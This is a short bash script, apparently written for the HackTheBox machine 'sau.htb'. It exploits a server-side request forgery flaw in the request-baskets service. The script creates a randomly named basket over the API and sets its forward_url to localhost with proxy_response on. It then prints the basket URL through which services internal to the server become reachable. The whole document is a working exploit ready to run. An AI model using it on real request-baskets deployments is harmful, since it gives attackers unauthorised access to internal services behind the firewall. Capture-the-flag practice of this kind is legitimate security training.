#!/bin/bash
vulnerable="http://sau.htb:55555"; #requests-buckets site
api_path="/api/baskets/"; #api path
target="http://localhost"; #target from the vulnerable site's point of view (localhost here indicates localhost on vulnerable server)
basket=$(LC_ALL=C tr -dc 'a-z' </dev/urandom | head -c "6");

vulnerablebasket="$vulnerable$api_path$basket";
body="{\"forward_url\": \"$target\",\"proxy_response\": true,\"insecure_tls\": false,\"expand_path\": true,\"capacity\": 250}";

echo "Creating vulnerable basket..."

curl -s -X POST -H 'Content-Type: application/json' -d "$body" "$vulnerablebasket" #post request to create basket with params
echo ""
echo "Access gained via: $vulnerable/$basket" #link to proxied website
